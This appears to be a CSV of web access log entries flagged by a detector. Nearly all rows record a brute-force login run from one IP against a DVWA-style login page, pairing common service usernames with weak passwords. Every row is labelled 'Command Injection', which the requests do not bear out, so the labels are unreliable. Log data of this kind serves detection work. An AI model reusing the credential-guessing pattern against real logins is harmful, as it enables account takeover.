access.log,Command Injection,06/Apr/2024:00:13:58 +0000,/,198.74.56.46,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/?username=puppet&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:34 +0000,/vulnerabilities/brute/?username=ansible&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:36 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=12345&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/?username=root&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/?username=admin&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:38 +0000,/vulnerabilities/brute/?username=test&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/?username=guest&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/?username=info&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:41 +0000,/vulnerabilities/brute/?username=adm&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/?username=mysql&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/?username=user&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:43 +0000,/vulnerabilities/brute/?username=administrator&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:44 +0000,/vulnerabilities/brute/?username=oracle&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/?username=ftp&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/?username=pi&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:46 +0000,/vulnerabilities/brute/?username=puppet&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/?username=ansible&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:48 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=123456789&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/?username=root&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:50 +0000,/vulnerabilities/brute/?username=admin&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/?username=test&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/?username=guest&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:52 +0000,/vulnerabilities/brute/?username=info&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/?username=adm&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:53 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/?username=mysql&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:54 +0000,/vulnerabilities/brute/?username=user&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/?username=administrator&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:55 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/?username=oracle&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:56 +0000,/vulnerabilities/brute/?username=ftp&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/?username=pi&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:57 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/?username=puppet&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:58 +0000,/vulnerabilities/brute/?username=ansible&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:59 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:57:59 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:00 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:00 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=password&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:01 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/?username=root&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:02 +0000,/vulnerabilities/brute/?username=admin&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/?username=test&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:03 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:04 +0000,/vulnerabilities/brute/?username=guest&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:04 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:05 +0000,/vulnerabilities/brute/?username=info&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:06 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:06 +0000,/vulnerabilities/brute/?username=adm&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:06 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:07 +0000,/vulnerabilities/brute/?username=mysql&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:07 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:07 +0000,/vulnerabilities/brute/?username=user&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:08 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:08 +0000,/vulnerabilities/brute/?username=administrator&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:08 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:09 +0000,/vulnerabilities/brute/?username=oracle&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:09 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:10 +0000,/vulnerabilities/brute/?username=ftp&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:11 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:11 +0000,/vulnerabilities/brute/?username=pi&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:11 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:12 +0000,/vulnerabilities/brute/?username=puppet&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:12 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:12 +0000,/vulnerabilities/brute/?username=ansible&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:13 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:13 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:13 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:14 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:14 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:15 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=iloveyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:16 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:16 +0000,/vulnerabilities/brute/?username=root&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:16 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:17 +0000,/vulnerabilities/brute/?username=admin&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:17 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:17 +0000,/vulnerabilities/brute/?username=test&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:18 +0000,/vulnerabilities/brute/?username=guest&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:19 +0000,/vulnerabilities/brute/?username=info&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:19 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:19 +0000,/vulnerabilities/brute/?username=adm&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:20 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:21 +0000,/vulnerabilities/brute/?username=mysql&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:21 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:21 +0000,/vulnerabilities/brute/?username=user&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:22 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:22 +0000,/vulnerabilities/brute/?username=administrator&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:22 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:23 +0000,/vulnerabilities/brute/?username=oracle&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:23 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:23 +0000,/vulnerabilities/brute/?username=ftp&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:24 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:24 +0000,/vulnerabilities/brute/?username=pi&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:24 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:25 +0000,/vulnerabilities/brute/?username=puppet&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:25 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:25 +0000,/vulnerabilities/brute/?username=ansible&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:26 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:26 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:26 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:27 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:27 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:27 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:28 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:28 +0000,/vulnerabilities/brute/?username=root&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:28 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:29 +0000,/vulnerabilities/brute/?username=admin&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:29 +0000,/vulnerabilities/brute/,202.166.151.1,-
